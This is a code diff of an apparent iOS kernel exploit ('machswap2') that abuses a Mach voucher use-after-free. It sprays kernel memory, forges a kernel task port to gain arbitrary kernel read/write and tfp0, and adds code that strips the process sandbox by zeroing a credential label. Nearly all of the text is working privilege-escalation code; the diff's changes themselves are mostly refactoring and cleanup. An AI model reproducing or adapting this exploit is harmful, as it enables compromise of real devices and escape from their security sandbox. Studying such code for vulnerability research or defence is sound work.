@@ -11,16 +11,27 @@
 
 #import <Foundation/Foundation.h>
 
-#include "common.h"             // LOG, uint64_t
-#include "pwn.h"
-#include "iokit.h"
+#include "../machswap/common.h"
+#include "machswap2_pwn.h"
+#include "../machswap/iokit.h"
+
+extern kern_return_t bootstrap_look_up(mach_port_t bp, char *name, mach_port_t *sp);
+extern mach_port_t mach_reply_port(void);
+extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
+extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);
+extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
+extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
+extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
+extern kern_return_t mach_vm_protect(task_t task, mach_vm_address_t addr, mach_vm_size_t size, boolean_t set_max, vm_prot_t new_prot);
+extern kern_return_t mach_vm_map(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur, vm_prot_t max, vm_inherit_t inheritance);
+extern kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
 
 // ********** ********** ********** constants ********** ********** **********
 
-const uint64_t IOSURFACE_CREATE_SURFACE =  0;
-const uint64_t IOSURFACE_SET_VALUE      =  9;
-const uint64_t IOSURFACE_GET_VALUE      = 10;
-const uint64_t IOSURFACE_DELETE_VALUE   = 11;
+static const uint64_t IOSURFACE_CREATE_SURFACE =  0;
+static const uint64_t IOSURFACE_SET_VALUE      =  9;
+static const uint64_t IOSURFACE_GET_VALUE      = 10;
+static const uint64_t IOSURFACE_DELETE_VALUE   = 11;
 
 // ********** ********** ********** helpers ********** ********** **********
 
@@ -62,35 +73,43 @@ typedef volatile struct
     /* 0x48 */ uint64_t iv_hash_link_prev;
 } fake_ipc_voucher_t;
 
-typedef volatile struct
-{
+typedef struct {
+    uint64_t hwlock;
+    uint64_t type;
+} lck_spin_t;
+
+struct ipc_object {
     uint32_t ip_bits;
     uint32_t ip_references;
-    struct {
-        uint64_t data;
-        uint64_t type;
-    } ip_lock; // spinlock
+    lck_spin_t io_lock_data;
+};
+
+typedef struct ipc_mqueue {
     struct {
         struct {
+            uint32_t flags;
+            uint32_t waitq_interlock;
+            uint64_t waitq_set_id;
+            uint64_t waitq_prepost_id;
             struct {
-                uint32_t flags;
-                uint32_t waitq_interlock;
-                uint64_t waitq_set_id;
-                uint64_t waitq_prepost_id;
-                struct {
-                    uint64_t next;
-                    uint64_t prev;
-                } waitq_queue;
-            } waitq;
-            uint64_t messages;
-            uint32_t seqno;
-            uint32_t receiver_name;
-            uint16_t msgcount;
-            uint16_t qlimit;
-            uint32_t pad;
-        } port;
-        uint64_t klist;
-    } ip_messages;
+                uint64_t next;
+                uint64_t prev;
+            } waitq_queue;
+        } waitq;
+        uint64_t messages;
+        uint32_t seqno;
+        uint32_t receiver_name;
+        uint16_t msgcount;
+        uint16_t qlimit;
+        uint32_t pad;
+    } port;
+    uint64_t klist;
+} *ipc_mqueue_t;
+
+typedef volatile struct
+{
+    struct ipc_object ip_object;
+    struct ipc_mqueue ip_messages;
     uint64_t ip_receiver;
     uint64_t ip_kobject;
     uint64_t ip_nsrequest;
@@ -150,7 +169,7 @@ struct simple_msg
 };
 
 /* credits to ian beer */
-mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size)
+static mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size)
 {
     // allocate a port to send the messages to
     mach_port_t q = MACH_PORT_NULL;
@@ -206,16 +225,16 @@ mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replace
     return q;
 }
 
-uint32_t message_size_for_kalloc_size(uint32_t size)
+static uint32_t message_size_for_kalloc_size(uint32_t size)
 {
     return ((size * 3) / 4) - 0x74;
 }
 
-void trigger_gc_please()
+static void trigger_gc_please()
 {
     // size = 100 * 16,384 * 256 = 419,430,400 = ~420mb (max)
     
-    const int gc_ports_cnt = 100;
+    const int gc_ports_cnt = 500;
     int gc_ports_max = gc_ports_cnt;
     mach_port_t gc_ports[gc_ports_cnt] = { 0 };
     
@@ -223,26 +242,56 @@ void trigger_gc_please()
     uint8_t *body = malloc(body_size);
     memset(body, 0x41, body_size);
     
+    int64_t avgTime = 0;
+    uint64_t maxTime = 0;
+    uint64_t avgDeviation = 0;
+    uint64_t maxDeviation = 0;
+    int extra_gc_count = 2;
+    
     for (int i = 0; i < gc_ports_cnt; i++)
     {
-        uint64_t t0, t1;
+        uint64_t t0;
+        int64_t tdelta;
         
         t0 = mach_absolute_time();
         gc_ports[i] = send_kalloc_message(body, body_size);
-        t1 = mach_absolute_time();
+        tdelta = mach_absolute_time() - t0;
+        uint64_t deviation = llabs(tdelta - avgTime);
+        if (i == 0) {
+            avgTime = maxTime = tdelta;
+            continue;
+        }
         
         /*
-         this won't necessarily get triggered on newer/faster devices (ie. >=A9)
-         this is mainly designed for older devices (in my case, A7) where spraying
-         such a large amount of data is a painful process
-         the idea here is to look for a longer spray which signals that GC may have
+         The idea here is to look for an abnormally longer spray which signals that GC may have
          taken place
          */
-        if (t1 - t0 > 1000000)
+        // TODO: Remove this log before merging to develop
+        // LOG("%d: T:%lld avg T:%lld D:%lld max D:%lld avg D:%lld", i, tdelta, avgTime, deviation, maxDeviation, avgDeviation);
+        
+        if (tdelta - avgTime > avgTime*2 ||
+            (deviation > MAX(avgDeviation * 2, 0x10000)) )
         {
-            LOG("got gc at %d -- breaking", i);
+            LOG("got gc at %d", i);
+            if (extra_gc_count-- > 0) {
+                continue;
+            }
+            LOG("breaking");
             gc_ports_max = i;
             break;
+        }
+        if (deviation > maxDeviation) {
+            avgDeviation = maxDeviation?(avgDeviation * i + maxDeviation) / (i+1):deviation;
+            maxDeviation = deviation;
+        } else {
+            avgDeviation = (avgDeviation * i + deviation) / (i+1);
+        }
+        
+        if (tdelta > maxTime) {
+            avgTime = (avgTime * i + maxTime) / (i+1);
+            maxTime = tdelta;
+        } else {
+            avgTime = (avgTime * i + tdelta) / (i+1);
         }
     }
     
@@ -392,7 +441,7 @@ static void set_nonblock(int fd)
     fcntl(fd, F_SETFL, flags);
 }
 
-int increase_file_limit()
+static int increase_file_limit()
 {
     int err = 0;
     struct rlimit rl = {};
@@ -466,13 +515,13 @@ static inline uint32_t mach_port_waitq_flags()
 }
 
 // kinda messy function signature
-uint64_t send_buffer_to_kernel_and_find(offsets_t *offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
+static uint64_t send_buffer_to_kernel_and_find(machswap_offsets_t *offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
 {
     kern_return_t ret;
     
     buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
-    buffer_msg->head.msgh_size = msg_size;
+    buffer_msg->head.msgh_size = (mach_msg_size_t)msg_size;
     
     mach_port_t port;
     ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
@@ -567,7 +616,7 @@ err:
     return 0x0;
 }
 
-uint64_t kalloc(mach_port_t the_one, uint64_t size)
+static uint64_t kalloc(mach_port_t the_one, uint64_t size)
 {
     kern_return_t ret;
     mach_vm_address_t addr;
@@ -582,7 +631,7 @@ uint64_t kalloc(mach_port_t the_one, uint64_t size)
     return (uint64_t)addr;
 }
 
-void kread(mach_port_t port, uint64_t addr, void *buf, size_t size)
+static void kread(mach_port_t port, uint64_t addr, void *buf, size_t size)
 {
     kern_return_t ret;
     size_t offset = 0;
@@ -606,18 +655,18 @@ void kread(mach_port_t port, uint64_t addr, void *buf, size_t size)
     }
 }
 
-uint64_t kread64(mach_port_t port, uint64_t addr)
+static uint64_t kread64(mach_port_t port, uint64_t addr)
 {
     uint64_t val = 0x0;
     kread(port, addr, (void *)&val, sizeof(val));
     return val;
 }
 
-void kwrite(mach_port_t port, uint64_t addr, void *buf, size_t len)
+static void kwrite(mach_port_t port, uint64_t addr, void *buf, size_t len)
 {
     kern_return_t ret;
     
-    ret = mach_vm_write(port, addr, (vm_offset_t)buf, len);
+    ret = mach_vm_write(port, addr, (vm_offset_t)buf, (mach_msg_type_number_t)len);
     
     if (ret != KERN_SUCCESS)
     {
@@ -625,14 +674,14 @@ void kwrite(mach_port_t port, uint64_t addr, void *buf, size_t len)
     }
 }
 
-void kwrite64(mach_port_t port, uint64_t addr, uint64_t val)
+static void kwrite64(mach_port_t port, uint64_t addr, uint64_t val)
 {
     kwrite(port, addr, &val, sizeof(val));
 }
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
 
-kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_back)
+kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_back)
 {
     kern_return_t ret = KERN_SUCCESS;
     
@@ -645,13 +694,22 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     mach_port_t postport[0x200] = { };
     
     kport_t *fakeport = NULL;
-    int *pipefds = NULL;
+    mach_port_t the_one = MACH_PORT_NULL;
     void *pipebuf = NULL;
+    int *pipefds = NULL;
+    int total_pipes = 0;
+    
+    host_t host = HOST_NULL;
+    host_t original_host = HOST_NULL;
+    thread_t thread = THREAD_NULL;
     
     /********** ********** data hunting ********** **********/
     
+    host = mach_host_self();
+    original_host = host;
+    thread = mach_thread_self();
     vm_size_t pgsz = 0;
-    ret = _host_page_size(mach_host_self(), &pgsz);
+    ret = _host_page_size(host, &pgsz);
     pagesize = pgsz;
     LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
     if (ret != KERN_SUCCESS)
@@ -710,7 +768,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     /* on 11.x the surface_t->addr3 entry doesn't exist */
     if (surface->id == 0x0)
     {
-        surface->id = surface->addr3;
+        surface->id = (uint32_t)surface->addr3;
     }
     LOG("surface ID: 0x%x", surface->id);
     
@@ -734,7 +792,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
 #define FILL_MEMSIZE 0x4000000
     int spray_qty = FILL_MEMSIZE / pagesize; /* # of pages to spray */
     
-    int spray_size = (5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize));
+    int spray_size = (int)((5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize)));
     uint32_t *spray_data = malloc(spray_size); // header + (spray_qty * (item_header + pgsize))
     bzero((void *)spray_data, spray_size);
     
@@ -750,7 +808,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
         *(spray_cur++) = kOSSerializeSymbol | 5;
         *(spray_cur++) = transpose(i);
         *(spray_cur++) = 0x0;
-        *(spray_cur++) = (i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1);
+        *(spray_cur++) = (uint32_t)((i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1));
         
         for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize;
              ptr + sizeof(fake_ipc_voucher_t) <= end;
@@ -763,7 +821,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     }
     
     /* we used this smaller dict later in order to reallocate our target OSString */
-    int small_dictsz = (9 * sizeof(uint32_t)) + pagesize;
+    int small_dictsz = (int)((9 * sizeof(uint32_t)) + pagesize);
     uint32_t *dict_small = malloc(small_dictsz);
     bzero((void *)dict_small, small_dictsz);
     
@@ -775,7 +833,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     dict_small[5] = kOSSerializeSymbol | 5;
     dict_small[6] = 0x0; /* Key */
     dict_small[7] = 0x0;
-    dict_small[8] = kOSSerializeEndCollection | kOSSerializeString | (pagesize - 1);
+    dict_small[8] = (uint32_t)(kOSSerializeEndCollection | kOSSerializeString | (pagesize - 1));
     
     ret = increase_file_limit();
     if (ret != 0)
@@ -784,7 +842,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
         goto out;
     }
     
-    int total_pipes = 0x500;
+    total_pipes = 0x500;
     size_t total_pipes_size = total_pipes * 2 * sizeof(int);
     pipefds = malloc(total_pipes_size);
     bzero(pipefds, total_pipes_size);
@@ -807,7 +865,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
             close(pipefds[i * 2]);
             close(pipefds[i * 2 + 1]);
             
-            total_pipes = i;
+            total_pipes = (int)i;
             break;
         }
         
@@ -827,25 +885,25 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     };
     
     mach_port_t p2;
-    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
+    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
     
     mach_port_t p3;
-    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);
+    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);
     
     /* allocate 0x2000 vouchers to alloc some new fresh pages */
-    for (int i = 0; i < sizeof(before) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x2000; i++)
     {
-        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
+        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
     }
     
     /* alloc our target uaf voucher */
     mach_port_t p1;
-    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
+    ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
     
     /* allocate 0x1000 more vouchers */
-    for (int i = 0; i < sizeof(after) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x1000; i++)
     {
-        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
+        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
     }
     
     /*
@@ -865,7 +923,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
      */
     
     /* set up to trigger the bug */
-    ret = thread_set_mach_voucher(mach_thread_self(), p1);
+    ret = thread_set_mach_voucher(thread, p1);
     
     ret = task_swap_mach_voucher(mach_task_self(), p1, &p2);
     
@@ -921,7 +979,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     }
     
     /* fingers crossed we get a userland handle onto our 'fakeport' object */
-    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
+    ret = thread_get_mach_voucher(thread, 0, &real_port_to_fake_voucher);
     
     for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
     {
@@ -996,7 +1054,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     
 found_voucher_lbl:;
     
-    mach_port_t the_one = real_port_to_fake_voucher;
+    the_one = real_port_to_fake_voucher;
     uint64_t original_port_addr = target_voucher->iv_port;
     
     fake_ipc_voucher_t new_voucher = (fake_ipc_voucher_t)
@@ -1010,9 +1068,9 @@ found_voucher_lbl:;
     bzero((void *)fakeport, sizeof(kport_t));
     
     /* set up our fakeport for use later */
-    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
-    fakeport->ip_references = 100;
-    fakeport->ip_lock.type = 0x11;
+    fakeport->ip_object.ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
+    fakeport->ip_object.ip_references = 100;
+    fakeport->ip_object.io_lock_data.type = 0x11;
     fakeport->ip_messages.port.receiver_name = 1;
     fakeport->ip_messages.port.msgcount = 0;
     fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
@@ -1078,7 +1136,7 @@ found_voucher_lbl:;
     }
     
     mach_port_t old_real_port = real_port_to_fake_voucher;
-    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);
+    ret = thread_get_mach_voucher(thread, 0, &real_port_to_fake_voucher);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to call thread_get_mach_voucher: %x %s", ret, mach_error_string(ret));
@@ -1268,6 +1326,8 @@ value = value | ((uint64_t)read64_tmp << 32);\
         LOG("failed to get IOSurfaceRootUserClient vtab!");
         goto out;
     }
+    if ((iosruc_vtab & 0xffffff0000000000) != 0xffffff0000000000)
+        iosruc_vtab |= 0xfffffff000000000;
     
     uint64_t get_trap_for_index_addr = 0x0;
     rk64(iosruc_vtab + (offsets->iosurface.get_external_trap_for_index * 0x8), get_trap_for_index_addr);
@@ -1276,6 +1336,9 @@ value = value | ((uint64_t)read64_tmp << 32);\
         LOG("failed to get IOSurface::getExternalTrapForIndex func ptr!");
         goto out;
     }
+    
+    if ((get_trap_for_index_addr & 0xffffff0000000000) != 0xffffff0000000000)
+        get_trap_for_index_addr |= 0xfffffff000000000;
     
 #define KERNEL_HEADER_OFFSET        0x4000
 #define KERNEL_SLIDE_STEP           0x100000
@@ -1300,7 +1363,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
     LOG("kslide: 0x%llx", kslide);
     
     /* find realhost */
-    ret = send_port(the_one, mach_host_self());
+    ret = send_port(the_one, host);
     if (ret != KERN_SUCCESS)
     {
         LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
@@ -1425,7 +1488,6 @@ value = value | ((uint64_t)read64_tmp << 32);\
     LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);
     
     /* as soon as we modify our fakeport, we don't want to be using our old rw gadgets */
-    
 #undef rk64
 #undef rk32
     
@@ -1522,8 +1584,11 @@ value = value | ((uint64_t)read64_tmp << 32);\
         goto out;
     }
     
+    host = mach_host_self();
     mach_port_t hsp4;
-    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
+    ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
+    mach_port_deallocate(mach_host_self(), host);
+    host = original_host;
     
     /* de-elevate */
     
@@ -1535,8 +1600,11 @@ value = value | ((uint64_t)read64_tmp << 32);\
         LOG("failed to de-elelvate to uid: %d", orig_uid);
         ret = KERN_FAILURE;
         goto out;
-    }
-    */
+    }*/
+    
+    /* unsandbox */
+    uint64_t cr_label = kread64(the_one, orig_ucred + 0x78);
+    kwrite64(the_one, cr_label + 0x10, 0);
     
     if (ret != KERN_SUCCESS ||
         !MACH_PORT_VALID(hsp4))
@@ -1554,7 +1622,6 @@ value = value | ((uint64_t)read64_tmp << 32);\
         goto out;
     }
     
-
     /* we're done! */
     LOG("tfp0 achieved!");
     LOG("base: 0x%llx", kbase_val);
@@ -1565,12 +1632,12 @@ value = value | ((uint64_t)read64_tmp << 32);\
     ret = KERN_SUCCESS;
     
     out:;
-    for (int i = 0; i < sizeof(preport) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x1000; i++)
     {
         mach_port_destroy(mach_task_self(), preport[i]);
     }
     
-    for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
+    for (int i = 0; i < 0x200; i++)
     {
         mach_port_destroy(mach_task_self(), postport[i]);
     }
@@ -1585,19 +1652,29 @@ value = value | ((uint64_t)read64_tmp << 32);\
         mach_port_destroy(mach_task_self(), the_one);
     }
     
-    if (pipefds)
-    {
-        for (int i = 0; i < total_pipes; i++)
-        {
+    for (size_t i = 0; i < 2 * total_pipes; i++) {
+        if (pipefds[i] != -1){
             close(pipefds[i]);
         }
-        
-        free(pipefds);
     }
     
-    if (pipebuf)
-    {
-        free(pipebuf);
+    if (pipebuf) {
+        mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)pipebuf, pagesize);
+    }
+    
+    if (pipefds) {
+        free((void *)pipefds);
+    }
+    
+    if (MACH_PORT_VALID(host)) {
+        mach_port_deallocate(mach_task_self(), host);
+        host = HOST_NULL;
+        original_host = HOST_NULL;
+    }
+    
+    if (MACH_PORT_VALID(thread)) {
+        mach_port_deallocate(mach_task_self(), thread);
+        thread = THREAD_NULL;
     }
     
     return ret;
